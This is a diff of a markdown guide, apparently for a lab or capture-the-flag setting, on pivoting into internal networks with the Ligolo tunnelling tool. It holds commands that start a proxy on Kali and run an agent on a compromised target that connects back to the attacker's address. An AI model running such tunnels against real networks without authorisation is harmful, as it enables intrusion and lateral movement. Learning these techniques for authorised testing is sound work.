@@ -37,21 +37,7 @@ Each new layer needs: a new TUN device, a new agent connecting to the _previous 
 
 ---
 
-## Setup — Fill In Your Own Values
-
-|Variable|Value|
-|---|---|
-|TUN0 IP (Kali VPN)|`10.10.14.14`|
-|Target 1 — External IP (reachable from Kali)|`10.10.10.5`|
-|Target 1 — Internal IP|`172.16.5.10`|
-|Target 1 internal range (auto-derived)|`172.16.5.0/24`|
-|Target 2 — External/reachable IP (via tunnel1)|`172.16.5.20`|
-|Target 2 — Internal IP|`172.16.6.15`|
-|Target 2 internal range (auto-derived)|`172.16.6.0/24`|
-
----
-
-## Pivot 1 — Into Target 1's Internal Range
+## 1st Pivot on 1st internal range
 
 **1. Create and bring up `tunnel1` on Kali**
 
@@ -65,16 +51,20 @@ Creates the virtual network interface Ligolo will route traffic through for this
 **2. Start the Ligolo proxy server on Kali**
 
 ```bash
-sudo ./proxy -selfcert
+sudo ligolo-proxy -selfcert
 ```
 
 Launches the Ligolo C2-style console and listens for incoming agent connections (self-signed TLS).
 
 **3. Run the agent on Target 1, connecting back to Kali's TUN0 IP**
 
+>**Windows**
+
 ```powershell
 .\agent.exe -connect 10.10.14.14:11601 -ignore-cert
 ```
+
+>**Linux**
 
 ```bash
 ./agent -connect 10.10.14.14:11601 -ignore-cert
